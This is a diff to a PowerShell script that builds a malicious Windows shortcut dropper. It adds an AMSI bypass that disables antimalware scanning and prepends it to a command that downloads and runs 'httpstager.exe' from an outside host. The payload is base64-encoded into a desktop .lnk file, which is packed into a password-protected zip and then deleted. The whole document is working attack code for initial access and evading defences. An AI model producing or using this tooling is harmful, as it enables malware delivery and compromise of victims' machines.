@@ -1,8 +1,13 @@
-$url = "http://10.10.10.10:8080/httpstager.exe"
+#For executables as stagers 
+#Malicious powershell commands
+$amsibypass = '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}$f.SetValue($null,$true);'
+$url = "http://10.211.55.2:8080/httpstager.exe"
 $dlpath = "$env:APPDATA\stager.exe"
-$payload = "Invoke-WebRequest -Uri '$url' -OutFile '$dlpath'; Start-Process '$dlpath'"
+$command = "Invoke-WebRequest -Uri '$url' -OutFile '$dlpath'; Start-Process '$dlpath'"
+$payload = $amsibypass + $command
 $enc_payload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
 
+#shortcut file commands
 $path = "$([Environment]::GetFolderPath('Desktop'))\demo.lnk"
 $wshell = New-Object -ComObject Wscript.Shell
 $shortcut = $wshell.CreateShortcut($path)
@@ -15,5 +20,9 @@ $shortcut.Description = "Demo"
 $shortcut.WindowStyle = 7 
 $shortcut.Save()
 
+#7zip encryption commands
 $password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
 Compress-7zip -Path $path -ArchiveFileName "demo.zip" -Format Zip - SecurePassword $password
+
+#Cleanup of lnk file
+rm $path
